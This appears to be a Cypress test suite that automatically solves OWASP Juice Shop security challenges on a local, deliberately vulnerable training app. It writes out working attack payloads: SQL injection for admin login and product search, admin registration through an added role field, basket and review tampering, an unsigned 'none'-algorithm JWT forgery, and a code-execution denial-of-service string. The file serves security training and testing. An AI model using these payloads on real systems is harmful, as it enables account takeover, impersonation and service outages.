//import '../support/index';

describe("Pwned JuiceShop", () => {
  
  describe("adding new user profile", () => {
  
    before(() => {
      // delete cookie ContinuousCode to reset scoreboard
      cy.clearCookies();
    });
      
    beforeEach(() => {
      // set cookie to mask popup
      cy.setCookie('welcomebanner_status', 'dismiss');
      cy.setCookie('cookieconsent_status', 'dismiss');
    });
  
    it("can register a cypress user", () => {

      cy.signup('cypress@mail.com','cypress');
     
    });
  
    it("can create a shipping address", () => {
        
      cy.signin('cypress@mail.com','cypress');
      
      cy.get('@token').then((token) => {
      
        const options = {
          method: 'POST',
          url: '/api/Addresss',
          body: {
            city: "Fruit City",
            country: "Fruit Country",
            fullName: "Cypress Home",
            mobileNum: 1000000000,
            state: "Fruit State",
            streetAddress: "123 Fruit Street",
            zipCode: "12345"
          },
          auth: {
            bearer: token
          }
        }

        cy.request(options).then((resp) => {
            expect(resp.status).to.eq(201);
            expect(resp.body.status).to.eq('success');
        });
        
      });
      
    });
    
    it("can add a credit or debit card", () => {
        
      cy.signin('cypress@mail.com','cypress');
      
      cy.get('@token').then((token) => {
          
        const options = {
          method: 'POST',
          url: '/api/Cards',
          body: {
            cardNum: 4000000000000000,
            expMonth: "12",
            expYear: "2080",
            fullName: "Cypress Credit Card"
          },
          auth: {
            bearer: token
          }
        };

        cy.request(options).then((resp) => {
            expect(resp.status).to.eq(201);
            expect(resp.body.status).to.eq('success');
            //{"status":"success"
        });
      });
        
    });
  
  });
  
  describe("solving miscellaneous challenge", () => {
      
    beforeEach(() => {
      // set cookie to mask popup
      cy.setCookie('welcomebanner_status', 'dismiss');
      cy.setCookie('cookieconsent_status', 'dismiss');
    });
      
    it("Find the carefully hidden ‘Score Board’ page.", () => {
      
      cy.visit('/#/score-board')
      .then(() => {
        cy.isSolvedChallenge('scoreBoardChallenge').should('eq', true);
      });
        
    });
      
  });
  
  describe("solving Security Misconfiguration challenge", () => {
      
    beforeEach(() => {
      // set cookie to mask popup
      cy.setCookie('welcomebanner_status', 'dismiss');
      cy.setCookie('cookieconsent_status', 'dismiss');
    });
      
    it("Provoke an error that is neither very gracefully nor consistently handled", () => {
      cy.visit('/rest/non-existing-ressource', {failOnStatusCode: false})
      cy.isSolvedChallenge('errorHandlingChallenge').should('eq', true);
    });
      
  });
  
  describe("solving broken access control challenges", () => {
      
    beforeEach(() => {
      // set cookie to mask popup
      cy.setCookie('welcomebanner_status', 'dismiss');
      cy.setCookie('cookieconsent_status', 'dismiss');
    });
    
    /*
    it("Access the administration section of the store.", () => {
      this challenge will be resolve just after Log in with the administrator’s user account
    });
    */
    
    it("Post a product review as another user or edit any user’s existing review", () => {
     
      cy.signin('cypress@mail.com','cypress');
      
      cy.get('@token').then((token) => {
        
        const options = {
          method: 'PUT',
          url: '/rest/products/1/reviews',
          body: {
            author: "admin@juice-sh.op",
            message: "very bad product"
          },
          auth: { 
            bearer: token
          }
        }

        cy.request(options).then(() => {
          cy.isSolvedChallenge('forgedReviewChallenge').should('eq', true);
        });
        
      });
    });
    
    it("Put an additional product into another user's shopping basket", () => {
     
      cy.signin('cypress@mail.com','cypress');
      
      cy.get('@token').then((token) => {
        
        // Axios allows to send JSON paylaod with duplicated key
        const axios = require('axios');
      
        const axiosOptions = {
          method: 'POST',
          url: '/api/BasketItems',
          data: `{"ProductId":12,"BasketId":"${sessionStorage.getItem('bid')}","quantity": 1,"BasketId":"2"}`,
          headers: { 
            Authorization: `Bearer ${token}`,
            'Content-Type': 'application/json'
          }
        };
        
        cy.window().then((win) => {
          axios(axiosOptions)
        });
        
        // waiting ContinuousCode (faire un spy ?)
        cy.wait(2000);
        
        cy.isSolvedChallenge('basketManipulateChallenge').should('eq', true);
        
      });
    });
      
  });
  
  describe("solving improper input validation challenges", () => {
      
    beforeEach(() => {
      // set cookie to mask popup
      cy.setCookie('welcomebanner_status', 'dismiss');
      cy.setCookie('cookieconsent_status', 'dismiss');
    });
    
    it("Register as a user with administrator privileges", () => {

      // Forge POST request to create an admin user
      const options = {
        method: 'POST',
        url: '/api/Users/',
        //form: true, // we are submitting a regular form body
        body: {
          email: 'pwned@juiceshop.com',
          password: 'pwned',
          passwordRepeat: 'pwned',
          role : 'admin',
          securityQuestion: {
            id: 5,
            question: 'Maternal grandmother\'s first name?',
            createdAt: '2020-06-11T21:38:56.400Z',
            updatedAt: '2020-06-11T21:38:56.400Z'
          },
          securityAnswer:"pwned"
        }
      };

      cy.request(options)
      .then(() => {
        cy.isSolvedChallenge('registerAdminChallenge').should('eq', true);
      });  
        
    });
    
  });
    
  describe("solving injection challenges", () => {
      
    beforeEach(() => {
      // set cookie to mask popup
      cy.setCookie('welcomebanner_status', 'dismiss');
      cy.setCookie('cookieconsent_status', 'dismiss');
    });
    
        it("Order the Christmas special offer of 2014.", () => {
      
      // Send HTTP request with SQL Injection in payload
      //  This is a way to verify if this request will be block by a WAF
      const options = {
        method: 'GET',
        url: 'http://localhost:3000/rest/products/search',
        qs: {
          q: "'))--"
        }
      }

      cy.request(options).then((resp) => {
    
        // Extract Christmas Super-Surprise-Box product detail from the catalogue
        var christmasSpecialOffer = resp.body.data.find(o => o.name === 'Christmas Super-Surprise-Box (2014 Edition)');
      
        // Login with cypress account
        cy.signin('cypress@mail.com','cypress');
      
        cy.getCookie('token').then((cookieToken) => {
      
          // Get basket ID
          var basketId = sessionStorage.getItem('bid');

          // Add Christmas Super-Surprise-Box to your basket
          const options = {
            method: 'POST',
            url: '/api/BasketItems',
            body: {
              BasketId: basketId,
              ProductId: christmasSpecialOffer.id,
              quantity: 1
            },
            auth: {
              bearer: cookieToken.value
            }
          }
      
          cy.request(options).then((resp) => {
          
            cy.visit('/#/basket');
            cy.get('#checkoutButton').click();
            
            //Select firt delivery address
            cy.get('#mat-radio-39 > .mat-radio-label > .mat-radio-container > .mat-radio-outer-circle').click({ force: true });
            cy.get('.btn-next').click();
            
            // Select the firt delivery mode
            cy.get('#mat-radio-41 > .mat-radio-label > .mat-radio-container > .mat-radio-outer-circle').click({ force: true });
            cy.get('.nextButton').click();
            
            // Select the first credit card
            cy.get('.mat-radio-outer-circle').click({ force: true });
            cy.get('.nextButton').click();
            
            // Confirm checkout
            cy.get('#checkoutButton').click();
            
            // check if challenge is solved
            cy.isSolvedChallenge('christmasSpecialChallenge').should('eq', true);
            
          });
        
        });
        
      });
        
    });
      
    it("Log in with the administrator’s user account.", () => {
      
      cy.visit('http://localhost:3000/#/login').then(() => {
        
        // SQL Injection
        cy.get('#email').type("' or 1=1--");
        cy.get('#password').type("foo");
        cy.get('#loginButton').click();
      
        // check if challenge is solved
        cy.isSolvedChallenge('loginAdminChallenge').should('eq', true);
        
        //Access the administration section of the store
        cy.visit('/#/administration');
        cy.wait(2000);
        cy.isSolvedChallenge('adminSectionChallenge').should('eq', true);
        
        // Logout
        cy.get('#navbarAccount').click();
        cy.get('#navbarLogoutButton > span').click();
      
      });
    

    
    });
      
  });
  
  
  describe("Solving insecure deserialization challenges", () => {
      
    beforeEach(() => {
      // set cookie to mask popup
      cy.setCookie('welcomebanner_status', 'dismiss');
      cy.setCookie('cookieconsent_status', 'dismiss');
    });
  
    it("Perform a Remote Code Execution that would keep a less hardened application busy forever", () => {
     
      cy.signin('cypress@mail.com','cypress');
      
      // Visit API documentation
      cy.visit('/api-docs');
      
      cy.get('@token').then((token) => {
        
        const options = {
          method: 'POST',
          url: '/b2b/v2/orders',
          body: {
            "orderLinesData": "(function dos() { while(true); })()"
          },
          auth: { 
            bearer: token
          },
          failOnStatusCode: false
        }

        cy.request(options).then(() => {
          cy.isSolvedChallenge('rceChallenge').should('eq', true);
        });
        
      });
    });
  
  });
  
  describe("Solving vulnerable components challenges", () => {
      
    beforeEach(() => {
      // set cookie to mask popup
      cy.setCookie('welcomebanner_status', 'dismiss');
      cy.setCookie('cookieconsent_status', 'dismiss');
    });
  
    it("Forge an essentially unsigned JWT token that impersonates the (non-existing) user jwtn3d@juice-sh.op", () => {
    
      // Login with cypress account
      cy.signin('cypress@mail.com','cypress');
    
      cy.getCookie('token').should('exist');
    
      // le cookie n'est pas encore setté par la webapp.
      // il faudra récupérer le token depuis la reponse http
      cy.getCookie('token').then((cookie) => {
          
         const jwt = require('jsonwebtoken');
        
         // Get Token
         var token = jwt.decode(cookie.value, {complete: true});
         expect(token.payload.data.email).to.equal('cypress@mail.com');
         
         // Forge an unsigned Token
         token.payload.data.email = 'jwtn3d@juice-sh.op';
         var unsignedToken = jwt.sign(token.payload,'nosecret',{ algorithm: 'none'});
         
         console.log(unsignedToken);
         
         // Forge POST request to create an admin user
        const options = {
          method: 'GET',
          url: '/api/Products/1',
          auth: {
            bearer: unsignedToken
          }
        }
    
    
        cy.request(options).then(() => {
            
            // check if challenge is solved
            cy.isSolvedChallenge('jwtUnsignedChallenge').should('eq', true);
            
            // Logout
            cy.visit('http://localhost:3000/#/login').then(() => {
              cy.get('#navbarAccount').click();
              cy.get('#navbarLogoutButton > span').click();
            });
            
        });
        
      });
      
    });
    
  });

  
  after(() => {
    cy.visit('/#/score-board');
  });
    
});
